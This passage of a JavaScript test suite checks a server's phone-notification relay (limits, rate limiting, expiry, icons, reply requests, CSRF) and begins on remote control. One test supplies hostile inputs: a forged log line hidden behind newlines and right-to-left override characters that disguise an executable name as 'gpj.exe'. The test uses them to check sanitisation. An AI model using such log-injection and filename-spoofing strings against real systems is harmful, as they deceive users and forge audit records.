test('1.5 Notifications reach only the audience, at once on background streams; updates, removals, listing', async () => {
  const { s, phone, desk, laptop, on } = await notifySetup('nt-share');
  try {
    await on(desk);
    const deskEv = await openEvents(s.port, desk, '/api/events?mode=background');
    const lapEv = await openEvents(s.port, laptop, '/api/events?mode=background');
    const phoneEv = await openEvents(s.port, phone, '/api/events?mode=background');
    for (const e of [deskEv, lapEv, phoneEv]) await e.wait('hello');
    assert.match(deskEv.events[0].data.instance, /^[a-f0-9]{16}$/, 'hello says which server process this is');
    await sleep(400);
    const lapBefore = lapEv.events.length;
    assert.equal((await putNote(s, phone, 'k1', note())).status, 204);
    const n = (await deskEv.wait('notification', d => d.id === 'ntphone0001/k1', 1000)).data;
    assert.deepEqual({ ...n, at: 0 }, {
      id: 'ntphone0001/k1', device: 'ntphone0001', deviceName: 'Robin Phone', app: 'com.whatsapp', appName: 'WhatsApp', icon: null,
      title: 'Mom', text: 'Dinner at 7?', lines: ['Mom: Dinner at 7?'], conversation: 'Family', when: 1790723000000, posted: null,
      silent: false, resent: false, actions: [{ id: 'a0', title: 'Reply', reply: true }, { id: 'a1', title: 'Mark as read' }], at: 0,
    });
    assert.ok(n.at > 0);
    // A re-send (after a restart or a reconnect) says so, with the time the phone posted it: passed on as they are.
    await putNote(s, phone, 'k1', note({ title: 'Mom (2 messages)', posted: 1790722990123.4, resent: true }));
    const resent = (await deskEv.wait('notification', d => d.title === 'Mom (2 messages)', 1000)).data;
    assert.deepEqual([resent.when, resent.posted, resent.resent], [1790723000000, 1790722990123, true]);
    await putNote(s, phone, 'k2', note({ app: 'org.telegram.messenger', appName: 'Telegram', title: 'Group', actions: [] }));
    await deskEv.wait('notification', d => d.id === 'ntphone0001/k2', 1000);
    const listed = await s.req('GET', '/api/phone/notifications', { headers: desk });
    assert.equal(listed.headers['cache-control'], 'no-store', 'content is never cached (WebView2 keeps an HTTP disk cache)');
    const list = listed.json.notifications;
    assert.deepEqual(list.map(x => x.id), ['ntphone0001/k2', 'ntphone0001/k1'], 'newest first; an update replaces');
    assert.equal(list[1].title, 'Mom (2 messages)');
    assert.deepEqual([list[1].posted, list[1].resent, list[0].posted, list[0].resent], [1790722990123, true, null, false]);
    let r = await s.req('GET', '/api/phone/notifications', { headers: laptop });
    assert.equal(r.status, 403);
    assert.equal(r.json.reason, 'off');
    assert.equal((await s.req('GET', '/api/phone/notifications', { headers: phone })).status, 403, 'the phone itself is not in the audience');
    assert.equal((await s.req('DELETE', '/api/phone/notifications/k2', { headers: phone })).status, 204);
    await deskEv.wait('notification-removed', d => d.id === 'ntphone0001/k2', 1000);
    assert.equal((await s.req('DELETE', '/api/phone/notifications/never-was', { headers: phone })).status, 204, 'removing an unknown key is fine');
    assert.equal((await s.req('DELETE', '/api/phone/notifications', { headers: phone })).status, 204);
    await deskEv.wait('notification-removed', d => d.device === 'ntphone0001' && d.all === true, 1000);
    assert.deepEqual((await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications, []);
    await sleep(300);
    assert.equal(lapEv.events.length, lapBefore, 'the laptop (not in the audience) got nothing, not even a write');
    assert.ok(!phoneEv.events.some(e => e.event.startsWith('notification')), 'nor did the phone');
    // Off: nothing more, at once.
    await on(desk, false);
    await putNote(s, phone, 'k3', note());
    await sleep(300);
    assert.ok(!deskEv.events.some(e => e.event === 'notification' && e.data.id === 'ntphone0001/k3'));
    assert.match(s.out, /Robin Phone shares notifications with Desktop/);
    assert.match(s.out, /Robin Phone stopped sharing notifications/);
    for (const e of [deskEv, lapEv, phoneEv]) e.close();
  } finally { await s.stop(); }
});

test('1.5 Notification limits: long fields are cut, bad ones refused, 16 KB bodies, about 20 changes a second, 100 per phone', async () => {
  const { s, phone, desk, on } = await notifySetup('nt-limits');
  try {
    await on(desk);
    const lines = Array.from({ length: 12 }, (_, i) => `line ${i} ${'y'.repeat(600)}`);
    const actions = [{ id: 'a', title: 'A'.repeat(60) }, { id: 'b', title: 'B', reply: true }, { id: 'c', title: 'C' }, { id: 'd', title: 'D' }];
    assert.equal((await putNote(s, phone, 'long', note({ title: 'T'.repeat(300), text: 'x'.repeat(5000), lines, actions, conversation: 'C'.repeat(300), extra: 'ignored' }))).status, 204);
    const [n] = (await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications;
    assert.equal(n.title.length, 200);
    assert.equal(n.text.length, 4096);
    assert.equal(n.conversation.length, 200);
    assert.equal(n.lines.length, 10, 'the last ten lines');
    assert.match(n.lines[0], /^line 2 /);
    assert.ok(n.lines.every(l => l.length === 500));
    assert.deepEqual(n.actions.map(a => [a.id, a.title.length, a.reply === true]), [['a', 40, false], ['b', 1, true], ['c', 1, false]]);
    assert.equal(n.extra, undefined, 'unknown fields are not kept');
    assert.equal((await putNote(s, phone, 'nullposted', note({ posted: null, resent: false }))).status, 204, 'posted may be null');
    for (const [label, body] of [
      ['no app', note({ app: undefined })], ['app not a package name', note({ app: 'Whats App!' })], ['bad icon', note({ icon: 'xyz' })],
      ['lines not a list', note({ lines: 'x' })], ['title not text', note({ title: 5 })], ['action without id', note({ actions: [{ title: 'x' }] })],
      ['repeated action id', note({ actions: [{ id: 'a', title: 'x' }, { id: 'a', title: 'y' }] })], ['bad when', note({ when: 'now' })],
      ['silent not boolean', note({ silent: 'no' })], ['bad posted', note({ posted: 'yesterday' })], ['negative posted', note({ posted: -1 })],
      ['resent not boolean', note({ resent: 'yes' })], ['resent null', note({ resent: null })],
    ]) {
      assert.equal((await putNote(s, phone, 'bad', body)).status, 400, label);
    }
    assert.equal((await putNote(s, phone, 'k'.repeat(201), note())).status, 400, 'a key over 200 characters');
    assert.equal((await putNote(s, phone, 'sp%20ace', note())).status, 400, 'a key with other characters');
    const big = await putNote(s, phone, 'big', note({ text: 'z'.repeat(17_000) }));
    assert.ok(big.status === 413 || big.status === 'reset', `a body over 16 KB: ${big.status}`);
    await sleep(1100);
    const statuses = await Promise.all(Array.from({ length: 30 }, (_, i) => putNote(s, phone, `burst${i}`, note()).then(r => [r.status, r.headers['retry-after']])));
    assert.ok(statuses.filter(([st]) => st === 204).length <= 21, 'about 20 a second');
    const limited = statuses.find(([st]) => st === 429);
    assert.ok(limited, 'then 429');
    assert.equal(limited[1], '1', 'with Retry-After');
    // At most 100 per phone: the oldest go (with notification-removed).
    const ev = await openEvents(s.port, desk);
    await ev.wait('hello');
    await s.req('DELETE', '/api/phone/notifications', { headers: phone });
    for (let i = 0; i < 105; i++) {
      if (i % 18 === 0) await sleep(1050);
      assert.equal((await putNote(s, phone, `cap${i}`, note({ title: `n${i}` }))).status, 204);
    }
    const all = (await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications;
    assert.equal(all.length, 100);
    assert.equal(all.at(-1).id, 'ntphone0001/cap5', 'the five oldest were dropped');
    await waitFor(() => ev.events.filter(e => e.event === 'notification-removed' && /\/cap[0-4]$/.test(e.data.id)).length === 5, 2000);
    ev.close();
  } finally { await s.stop(); }
});

test('1.5 Notifications are dropped after a day (shortened in tests), and a restart leaves none', async () => {
  let { s, phone, desk, on } = await notifySetup('nt-ttl', { env: { BEAM_TEST_NOTE_TTL_MS: '1000' } });
  try {
    await on(desk);
    const ev = await openEvents(s.port, desk);
    const instance = (await ev.wait('hello')).data.instance;
    await putNote(s, phone, 'old', note());
    await sleep(1200);
    assert.deepEqual((await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications, [], 'gone after the time limit');
    await ev.wait('notification-removed', d => d.id === 'ntphone0001/old', 1000);
    ev.close();
    await putNote(s, phone, 'fresh', note());
    assert.equal((await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications.length, 1);
    await s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${s.key}` } });
    await s.exited;
    s = await startServer('nt-ttl', 8791, { keep: true, env: { BEAM_TEST_NOTE_TTL_MS: '1000' } });
    assert.deepEqual((await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications, [], 'a restart leaves nothing');
    const ev2 = await openEvents(s.port, desk);
    assert.notEqual((await ev2.wait('hello')).data.instance, instance, 'and says so with a new instance');
    ev2.close();
  } finally { await s.stop(); }
});

test('1.5 Icons: stored under their SHA-256 (checked), PNG only, 32 KB, cached immutable, at most 300 kept', async () => {
  const { s, phone, desk } = await notifySetup('nt-icons');
  try {
    const icon = png(1);
    const hash = sha256(icon);
    assert.equal((await s.req('HEAD', `/api/phone/icons/${hash}`, { headers: phone })).status, 404, 'the phone asks first');
    assert.equal((await s.req('PUT', `/api/phone/icons/${hash}`, { headers: { ...phone, 'Content-Type': 'image/png' }, body: icon })).status, 204);
    const got = await s.req('GET', `/api/phone/icons/${hash}`, { headers: desk, raw: true });
    assert.equal(got.status, 200);
    assert.equal(got.headers['content-type'], 'image/png');
    assert.equal(got.headers['cache-control'], 'private, max-age=31536000, immutable');
    assert.equal(Buffer.compare(got.body, icon), 0);
    assert.equal((await s.req('HEAD', `/api/phone/icons/${hash}`, { headers: desk })).status, 200);
    assert.equal((await s.req('PUT', `/api/phone/icons/${sha256(png(2))}`, { headers: { ...phone, 'Content-Type': 'image/png' }, body: icon })).status, 400, 'hash must match');
    const notPng = Buffer.from('GIF89a not a png at all');
    assert.equal((await s.req('PUT', `/api/phone/icons/${sha256(notPng)}`, { headers: { ...phone, 'Content-Type': 'image/png' }, body: notPng })).status, 400, 'PNG only');
    assert.equal((await s.req('PUT', `/api/phone/icons/${hash}`, { headers: { ...phone, 'Content-Type': 'image/jpeg' }, body: icon })).status, 415);
    const huge = png(3, 33 * 1024);
    const tooBig = await s.req('PUT', `/api/phone/icons/${sha256(huge)}`, { headers: { ...phone, 'Content-Type': 'image/png' }, body: huge });
    assert.ok(tooBig.status === 413 || tooBig.status === 'reset', `over 32 KB: ${tooBig.status}`);
    assert.equal((await s.req('GET', `/api/phone/icons/${'0'.repeat(64)}`, { headers: desk })).status, 404);
    assert.equal((await s.req('GET', `/api/phone/icons/${hash}`)).status, 401, 'signed-in devices only');
    for (let i = 10; i < 311; i++) {
      const b = png(i);
      await s.req('PUT', `/api/phone/icons/${sha256(b)}`, { headers: { ...phone, 'Content-Type': 'image/png' }, body: b });
    }
    assert.equal((await s.req('GET', `/api/phone/icons/${sha256(png(10))}`, { headers: desk })).status, 404, 'the least recently used went');
    assert.equal((await s.req('GET', `/api/phone/icons/${sha256(png(310))}`, { headers: desk })).status, 200);
  } finally { await s.stop(); }
});

test('1.5 Requests from a PC: reply, action, dismiss and bulk go to the phone only, its answer to the asker only; errors and timeout', async () => {
  const { s, K, phone, desk, laptop, on } = await notifySetup('nt-requests');
  try {
    await on(desk);
    const browser = app(K, 'ntbrowse001', 'Browser', 'web', from('100.64.87.4'));
    await s.req('GET', '/api/me', { headers: browser });
    await on(browser);
    const phoneEv = await openEvents(s.port, phone, '/api/events?mode=background');
    const deskEv = await openEvents(s.port, desk, '/api/events?mode=background');
    const browserEv = await openEvents(s.port, browser, '/api/events?mode=background');
    for (const e of [phoneEv, deskEv, browserEv]) await e.wait('hello');
    for (const k of ['k1', 'k2', 'k3']) await putNote(s, phone, k, note());
    const ask = (route, body, h = desk) => s.req('POST', `/api/phone/notifications/${route}`, { headers: json(h), body: JSON.stringify(body) });
    // Reply
    let r = await ask('ntphone0001/k1/reply', { action: 'a0', text: 'On my way' });
    assert.equal(r.status, 202);
    assert.equal(r.headers['cache-control'], 'no-store');
    const rid = r.json.request;
    assert.match(rid, /^[a-f0-9]{16}$/);
    const asked = (await phoneEv.wait('notification-request', d => d.request === rid, 1000)).data;
    assert.deepEqual(asked, { request: rid, kind: 'reply', keys: ['k1'], action: 'a0', text: 'On my way', from: 'ntdesk00001', by: 'Desktop' });
    assert.ok(!browserEv.events.some(e => e.event === 'notification-request'), 'only the phone gets the request');
    assert.equal((await s.req('POST', `/api/phone/requests/${rid}`, { headers: json(desk), body: '{"ok":true}' })).status, 404, 'only the phone answers');
    const answered = await s.req('POST', `/api/phone/requests/${rid}`, { headers: json(phone), body: '{"ok":true}' });
    assert.deepEqual([answered.status, answered.headers['cache-control']], [204, 'no-store']);
    assert.deepEqual((await deskEv.wait('notification-request-done', d => d.request === rid, 1000)).data, { request: rid, ok: true });
    assert.ok(!browserEv.events.some(e => e.event === 'notification-request-done'), 'only the asker hears the answer');
    assert.equal((await s.req('POST', `/api/phone/requests/${rid}`, { headers: json(phone), body: '{"ok":true}' })).status, 404, 'answered once');
    // Action (URL-encoded id works too), failing on the phone
    r = await ask('ntphone0001%2Fk2/action', { action: 'a1' });
    assert.equal(r.status, 202);
    const rid2 = r.json.request;
    assert.equal((await phoneEv.wait('notification-request', d => d.request === rid2, 1000)).data.kind, 'action');
    await s.req('POST', `/api/phone/requests/${rid2}`, { headers: json(phone), body: '{"ok":false,"error":"Open it on the phone"}' });
    assert.deepEqual((await deskEv.wait('notification-request-done', d => d.request === rid2, 1000)).data, { request: rid2, ok: false, error: 'Open it on the phone' });
    // Dismiss one, then bulk
    r = await ask('ntphone0001/k3/dismiss', {}, browser);
    assert.equal(r.status, 202);
    assert.deepEqual((await phoneEv.wait('notification-request', d => d.request === r.json.request, 1000)).data.keys, ['k3']);
    r = await ask('dismiss', { ids: ['ntphone0001/k1', 'ntphone0001/k2', 'ntphone0001/gone'] });
    assert.equal(r.status, 202);
    const bulk = (await phoneEv.wait('notification-request', d => d.request === r.json.request, 1000)).data;
    assert.deepEqual([bulk.kind, bulk.keys], ['dismiss', ['k1', 'k2']], 'only the ones that still exist');
    // No answer within the time limit (1.5 s in tests): "timeout"
    await sleep(1700);
    assert.deepEqual((await deskEv.wait('notification-request-done', d => d.request === r.json.request, 1000)).data, { request: r.json.request, ok: false, error: 'timeout' });
    assert.equal((await s.req('POST', `/api/phone/requests/${r.json.request}`, { headers: json(phone), body: '{"ok":true}' })).status, 404, 'too late');
    // Errors
    r = await ask('ntphone0001/k1/reply', { action: 'a0', text: 'hi' }, laptop);
    assert.deepEqual([r.status, r.json.reason, r.headers['cache-control']], [403, 'off', 'no-store'], 'not in the audience');
    assert.equal((await ask('ntphone0001/nope/reply', { action: 'a0', text: 'hi' })).status, 404, 'gone');
    assert.equal((await ask('ntphone0001/k1/reply', { action: 'a1', text: 'hi' })).status, 400, 'not a reply action');
    assert.equal((await ask('ntphone0001/k1/reply', { action: 'a0', text: '  ' })).status, 400, 'empty reply');
    assert.equal((await ask('ntphone0001/k1/reply', { action: 'a0', text: 'x'.repeat(4097) })).status, 400, 'reply over 4096 characters');
    assert.equal((await ask('ntphone0001/k1/action', { action: 'a0' })).status, 400, 'replies use /reply');
    assert.equal((await ask('dismiss', { ids: [] })).status, 400);
    assert.equal((await ask('dismiss', { ids: Array.from({ length: 101 }, (_, i) => `ntphone0001/x${i}`) })).status, 400);
    assert.equal((await ask('dismiss', { ids: ['ntphone0001/k1', 'otherphone01/k1'] })).status, 400, 'one phone at a time');
    phoneEv.close();
    await sleep(300);
    r = await ask('ntphone0001/k1/dismiss', {});
    assert.deepEqual([r.status, r.json.reason], [409, 'offline'], 'the phone has no event stream');
    assert.match(s.out, /Desktop replied to a WhatsApp notification on Robin Phone/);
    deskEv.close();
    browserEv.close();
  } finally { await s.stop(); }
});

test('1.5 Requests from PCs are limited (about 5 a second per device, 20 waiting per phone); the log sums up a flood', async () => {
  const { s, K, phone, desk, laptop, on } = await notifySetup('nt-flood');
  try {
    const third = app(K, 'ntthird0001', 'Third PC', 'windows', from('100.64.87.5'));
    await s.req('GET', '/api/me', { headers: third });
    for (const h of [desk, laptop, third]) await on(h);
    const phoneEv = await openEvents(s.port, phone, '/api/events?mode=background');
    await phoneEv.wait('hello');
    assert.equal((await putNote(s, phone, 'k1', note())).status, 204);
    const reply = (h, text) => s.req('POST', '/api/phone/notifications/ntphone0001/k1/reply', { headers: json(h), body: JSON.stringify({ action: 'a0', text }) });
    const asked = () => phoneEv.events.filter(e => e.event === 'notification-request');
    // One PC sends 30 replies at once: ten reach the phone, the rest get 429 with Retry-After.
    const statuses = await Promise.all(Array.from({ length: 30 }, (_, i) => reply(desk, `r${i}`).then(r => [r.status, r.headers['retry-after'], r.headers['cache-control']])));
    assert.equal(statuses.filter(([st]) => st === 202).length, 10, 'ten at once');
    const limited = statuses.filter(([st]) => st === 429);
    assert.equal(limited.length, 20);
    assert.ok(limited.every(([, ra, cc]) => Number(ra) >= 1 && Number(ra) <= 2 && cc === 'no-store'), `Retry-After: ${limited[0][1]}`);
    await waitFor(() => asked().length === 10, 1000);
    // At most 20 wait for one phone: the laptop's ten fill it up, and a third PC is turned away (busy) until one is answered.
    const lap = await Promise.all(Array.from({ length: 10 }, (_, i) => reply(laptop, `l${i}`).then(r => r.status)));
    assert.deepEqual(lap, Array(10).fill(202));
    let r = await reply(third, 'one more');
    assert.deepEqual([r.status, r.json.reason, Number(r.headers['retry-after']) >= 1], [429, 'busy', true], 'twenty already wait for the phone');
    assert.equal((await s.req('POST', `/api/phone/requests/${asked()[0].data.request}`, { headers: json(phone), body: '{"ok":true}' })).status, 204);
    r = await reply(third, 'one more');
    assert.equal(r.status, 202, 'room again after an answer');
    await sleep(100);
    assert.equal(asked().length, 21, 'the phone was asked 21 times in all, not 42');
    // The log: per device, one line for its first reply and one summing up the rest (after the minute, 1 s in tests).
    // The rest time out (1.5 s in tests): summed up the same way.
    await sleep(3500);
    const lines = s.out.split('\n');
    const count = re => lines.filter(l => re.test(l)).length;
    assert.equal(count(/Desktop replied to a WhatsApp notification on Robin Phone/), 1);
    assert.equal(count(/Desktop sent Robin Phone 9 more replies in the last minute/), 1);
    assert.equal(count(/Laptop sent Robin Phone 9 more replies in the last minute/), 1);
    assert.equal(count(/Third PC replied to a WhatsApp notification on Robin Phone/), 1);
    assert.ok(count(/didn't answer/) <= 5, `timeouts summed up too: ${count(/didn't answer/)} lines`);
    assert.equal(count(/Robin Phone didn't answer 8 more of Desktop's requests in time/), 1);
    phoneEv.close();
  } finally { await s.stop(); }
});

test('1.5 Text from the phone: bidi controls go everywhere; app names and action titles are one clean line (no forged log lines)', async () => {
  const { s, phone, desk, on } = await notifySetup('nt-text');
  try {
    await on(desk);
    const phoneEv = await openEvents(s.port, phone);
    const deskEv = await openEvents(s.port, desk);
    for (const e of [phoneEv, deskEv]) await e.wait('hello');
    const RLO = '\u202e', LRI = '\u2066', PDI = '\u2069', RLM = '\u200f';
    const forged = '2026-10-01T00:00:00.000Z INFO  Desktop removed every device';
    assert.equal((await putNote(s, phone, 'k1', note({
      appName: ` Chat\n${forged}\r\n${RLO}gpj.exe\u0085 `,
      title: `Mom${RLO}\nand Dad\t!`,
      text: `Line one${RLO}\r\nLine two\u2028three\u0007\tend`,
      lines: [`${LRI}Mom${PDI}: hi${RLM}\nthere`],
      conversation: `Fam${RLO}ily\nchat`,
      actions: [{ id: 'a0', title: `Re${RLO}ply\n${forged}`, reply: true }],
    }))).status, 204);
    const [n] = (await s.req('GET', '/api/phone/notifications', { headers: desk })).json.notifications;
    assert.equal(n.appName, `Chat ${forged} gpj.exe`, 'one line, no bidi or other control characters');
    assert.equal(n.title, 'Mom and Dad !', 'one line');
    assert.equal(n.text, 'Line one\nLine two\nthree\tend', 'line breaks and tabs stay in the text');
    assert.deepEqual(n.lines, [`Mom: hi${RLM}\nthere`], 'isolates go; marks and line breaks stay');
    assert.equal(n.conversation, 'Family chat');
    assert.equal(n.actions[0].title, `Reply ${forged}`.slice(0, 40));
    const r = await s.req('POST', '/api/phone/notifications/ntphone0001/k1/reply', { headers: json(desk), body: JSON.stringify({ action: 'a0', text: 'ok' }) });
    assert.equal(r.status, 202);
    await phoneEv.wait('notification-request', d => d.request === r.json.request, 1000);
    // The phone's error text, shown on the PC: one clean line too.
    await s.req('POST', `/api/phone/requests/${r.json.request}`, { headers: json(phone), body: JSON.stringify({ ok: false, error: `No${RLO}pe\nsecond line` }) });
    assert.equal((await deskEv.wait('notification-request-done', d => d.request === r.json.request, 1000)).data.error, 'Nope second line');
    await sleep(200);
    const lines = s.out.split('\n');
    assert.ok(lines.some(l => l.includes(`Desktop replied to a Chat ${forged} gpj.exe notification on Robin Phone`)), 'the app name stays on its line');
    assert.ok(lines.some(l => l.includes(`Robin Phone couldn't do what Desktop asked (reply, Chat ${forged} gpj.exe)`)));
    assert.ok(!lines.some(l => l.includes('Desktop removed every device') && !/replied to a|couldn't do what/.test(l)), 'no forged line');
    assert.ok(![RLO, LRI, PDI].some(c => s.out.includes(c)), 'no bidi controls in the log');
    phoneEv.close();
    deskEv.close();
  } finally { await s.stop(); }
});

test('1.5 Phone notification changes from a browser need same-origin proof (CSRF)', async () => {
  const { s, K, phone, on } = await notifySetup('nt-csrf');
  try {
    const login = await post(s, '/api/login', { secret: K }, { ...sameOrigin, ...from('100.64.87.9'), Cookie: 'beam_device_id=ntcookie001' });
    const page = { ...cookie(cookieValue(login), 'ntcookie001'), 'X-Beam-Platform': 'web', ...from('100.64.87.9') };
    await s.req('GET', '/api/me', { headers: page });
    assert.equal((await s.req('PUT', '/api/devices/me/settings', { headers: { ...page, 'Content-Type': 'application/json', Origin: 'https://elsewhere.example' }, body: '{"phoneNotifications":true}' })).status, 403);
    assert.equal((await s.req('PUT', '/api/devices/me/settings', { headers: { ...page, ...sameOrigin, 'Content-Type': 'application/json' }, body: '{"phoneNotifications":true}' })).status, 204);
    await putNote(s, phone, 'k1', note());
    await openEvents(s.port, phone).then(e => e.wait('hello'));
    const cross = await s.req('POST', '/api/phone/notifications/ntphone0001/k1/dismiss', { headers: { ...page, 'Content-Type': 'application/json', Origin: 'https://elsewhere.example' }, body: '{}' });
    assert.deepEqual([cross.status, cross.json.reason], [403, 'csrf']);
    assert.equal((await s.req('POST', '/api/phone/notifications/ntphone0001/k1/dismiss', { headers: { ...page, ...sameOrigin, 'Content-Type': 'application/json' }, body: '{}' })).status, 202);
    void on;
  } finally { await s.stop(); }
});

test('1.5 Notification content never reaches the disk or the log', async () => {
  const marks = ['ZQTITLE7731', 'ZQTEXT8842', 'ZQLINE9953', 'ZQCONV1064', 'ZQREPLY2175', 'ZQACTION3286', 'ZQERROR4397'];
  let { s, phone, desk, on } = await notifySetup('nt-private');
  try {
    await on(desk);
    const phoneEv = await openEvents(s.port, phone);
    const deskEv = await openEvents(s.port, desk);
    for (const e of [phoneEv, deskEv]) await e.wait('hello');
    const body = note({ title: marks[0], text: marks[1], lines: [marks[2]], conversation: marks[3], actions: [{ id: 'a0', title: 'Reply', reply: true }, { id: 'a1', title: marks[5] }] });
    await putNote(s, phone, 'secret1', body);
    await putNote(s, phone, 'secret1', { ...body, text: `${marks[1]} updated` });
    await putNote(s, phone, 'secret2', body);
    await deskEv.wait('notification', d => d.id === 'ntphone0001/secret2');
    assert.ok((await s.req('GET', '/api/phone/notifications', { headers: desk })).body.includes(marks[0]), 'the content does reach the audience');
    let r = await s.req('POST', '/api/phone/notifications/ntphone0001/secret1/reply', { headers: json(desk), body: JSON.stringify({ action: 'a0', text: marks[4] }) });
    await s.req('POST', `/api/phone/requests/${r.json.request}`, { headers: json(phone), body: JSON.stringify({ ok: false, error: marks[6] }) });
    r = await s.req('POST', '/api/phone/notifications/ntphone0001/secret2/action', { headers: json(desk), body: '{"action":"a1"}' });
    await s.req('POST', `/api/phone/requests/${r.json.request}`, { headers: json(phone), body: '{"ok":true}' });
    await s.req('POST', '/api/phone/notifications/dismiss', { headers: json(desk), body: JSON.stringify({ ids: ['ntphone0001/secret1', 'ntphone0001/secret2'] }) });
    await s.req('GET', '/api/metrics', { headers: desk });
    await s.req('DELETE', '/api/phone/notifications/secret1', { headers: phone });
    await sleep(1800); // the bulk dismiss times out (and is logged)
    phoneEv.close();
    deskEv.close();
    await s.req('POST', '/api/admin/shutdown', { headers: { Authorization: `Bearer ${s.key}` } });
    await s.exited;
    const files = [];
    const walk = dir => { for (const e of fs.readdirSync(dir, { withFileTypes: true })) (e.isDirectory() ? walk(path.join(dir, e.name)) : files.push(path.join(dir, e.name))); };
    walk(s.dir);
    assert.ok(files.some(f => /server\.log$/.test(f)) && files.some(f => /devices\.json$/.test(f)), 'the log and the state files were checked');
    for (const f of files) {
      const text = fs.readFileSync(f).toString('utf8');
      for (const m of marks) assert.ok(!text.includes(m), `${m} found in ${path.relative(s.dir, f)}`);
    }
    for (const m of marks) assert.ok(!s.out.includes(m), `${m} in the server's output`);
    assert.match(s.out, /Desktop replied to a WhatsApp notification/, 'the activity log still says what happened');
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- 1.6 remote control

// A fake tailnet: Robin's machines, each with an IPv4 and an IPv6 address; Mallory's machine (not an owner); the
// server is 100.64.91.100. 100.64.91.11 is the desk's Tailscale node at a new address (the same StableID).
const RC_NET = {
  pc: { ip4: '100.64.91.1', ip6: 'fd7a:115c:a1e0::5b01', node: 'desk', id: 'nDESK' },
  laptop: { ip4: '100.64.91.2', ip6: 'fd7a:115c:a1e0::5b02', node: 'robin-laptop', id: 'nLAPTOP' },
  phone: { ip4: '100.64.91.3', ip6: 'fd7a:115c:a1e0::5b03', node: 'pixel', id: 'nPIXEL' },
  other: { ip4: '100.64.91.4', ip6: 'fd7a:115c:a1e0::5b04', node: 'other-pc', id: 'nOTHER' },
  fresh: { ip4: '100.64.91.5', ip6: 'fd7a:115c:a1e0::5b05', node: 'new-laptop', id: 'nFRESH' },
  mallory: { ip4: '100.64.91.6', ip6: 'fd7a:115c:a1e0::5b06', node: 'mallory-pc', id: 'nMALLORY', login: 'mallory@example.com' },
  shop: { ip4: '100.64.91.20', ip6: 'fd7a:115c:a1e0::5b14', node: 'shop-desktop', id: 'nSHOP' },
};
const deviceKey = () => crypto.randomBytes(32).toString('base64url');
const RC_USER = 'robin@example.com';
const RC_PROFILE = { pc: 'a1a1a1a1a1a1a1a1', laptop: 'b2b2b2b2b2b2b2b2', phone: 'c3c3c3c3c3c3c3c3', other: 'd4d4d4d4d4d4d4d4' };

// A scratch server with that tailnet, a PC (Beam 1.6 for Windows), a laptop, a phone and another PC.
async function rcSetup(name, { env = {}, tailnet = true } = {}) {
  const whois = {};
  for (const m of Object.values(RC_NET)) for (const ip of [m.ip4, m.ip6]) whois[ip] = { login: m.login || RC_USER, node: m.node, stableId: m.id, ips: [m.ip4, m.ip6] };
  whois['100.64.91.11'] = { login: RC_USER, node: 'desk', stableId: 'nDESK', ips: ['100.64.91.11', RC_NET.pc.ip6] };
  const ts = tailnet ? await fakeTailscale({
    self: ['100.64.91.100', 'fd7a:115c:a1e0::5b64'],
    peers: Object.values(RC_NET).map(m => ({ name: m.node, ips: [m.ip4, m.ip6], user: m.login || RC_USER })),
    whois,
  }) : null;
  const t = { ts, env: { ...(ts && { BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket }), ...env } };
  t.s = await startServer(name, 8791, { env: t.env });
  t.K = t.s.key;
  const v16 = { 'X-Beam-App-Version': '1.6.0' };
  t.pc = app(t.K, 'rcdesk00001', 'Desktop', 'windows', { ...from(RC_NET.pc.ip4), ...v16, 'X-Beam-Profile': RC_PROFILE.pc });
  t.laptop = app(t.K, 'rclaptop001', 'Robin Laptop', 'windows', { ...from(RC_NET.laptop.ip4), ...v16, 'X-Beam-Profile': RC_PROFILE.laptop });
  t.phone = app(t.K, 'rcphone0001', 'Pixel', 'android', { ...from(RC_NET.phone.ip6), ...v16, 'X-Beam-Profile': RC_PROFILE.phone });
  t.other = app(t.K, 'rcother0001', 'Other PC', 'windows', { ...from(RC_NET.other.ip4), ...v16, 'X-Beam-Profile': RC_PROFILE.other });
  for (const h of [t.pc, t.laptop, t.phone, t.other]) await t.s.req('GET', '/api/me', { headers: h });
  t.status = (h, body) => t.s.req('PUT', '/api/devices/me/status', { headers: json(h), body: JSON.stringify(body) });
  t.rc = (method, route, h, body) => t.s.req(method, `/api/rc/${route}`, { headers: json(h), ...(body !== undefined && { body: JSON.stringify(body) }) });
  t.start = (h, device = 'rcdesk00001') => t.rc('POST', 'sessions', h, { device });
  t.stop = async () => { await t.s.stop(); await t.ts?.close(); };
  return t;
}

test('1.6 Remote control: PCs report their switch and lock; can.remoteControl needs Windows, app 1.6+, the switch on, unlocked', async () => {
  const t = await rcSetup('rc-can', { tailnet: false });
  try {
    const { s, pc, phone, status } = t;
    const dev = async id => (await s.req('GET', '/api/devices', { headers: t.laptop })).json.devices.find(d => d.id === id);
    assert.equal((await dev('rcdesk00001')).can.remoteControl, false, 'off until the PC says otherwise');
    assert.equal((await status(pc, { remoteControl: 'yes' })).status, 400);
    assert.equal((await status(pc, { locked: 1 })).status, 400);
    assert.equal((await status(pc, { remoteControl: true, locked: false })).status, 204);
    let d = await dev('rcdesk00001');
    assert.deepEqual([d.can.remoteControl, d.status.remoteControl, d.status.locked], [true, true, false]);
    await status(pc, { locked: true });
    d = await dev('rcdesk00001');
    assert.deepEqual([d.can.remoteControl, d.status.locked], [false, true], 'not while it is locked');
    await status(pc, { locked: false, remoteControl: false });
    assert.equal((await dev('rcdesk00001')).can.remoteControl, false, 'switched off');
    const old = app(t.K, 'rcold000001', 'Old PC', 'windows', { ...from('100.64.91.9'), 'X-Beam-App-Version': '1.5.0', 'X-Beam-Profile': 'f6f6f6f6f6f6f6f6' });
    await s.req('GET', '/api/me', { headers: old });
    await status(old, { remoteControl: true });
    await status(phone, { remoteControl: true });
    assert.equal((await dev('rcold000001')).can.remoteControl, false, 'a 1.5 app');
    assert.equal((await dev('rcphone0001')).can.remoteControl, false, 'not a Windows PC');
    // The switch reported by a request that isn't the app itself (no X-Beam-Profile) doesn't tie remote control to it.
    const noProfile = app(t.K, 'rcnoprof001', 'Bare PC', 'windows', { ...from('100.64.91.8'), 'X-Beam-App-Version': '1.6.0' });
    await s.req('GET', '/api/me', { headers: noProfile });
    await status(noProfile, { remoteControl: true });
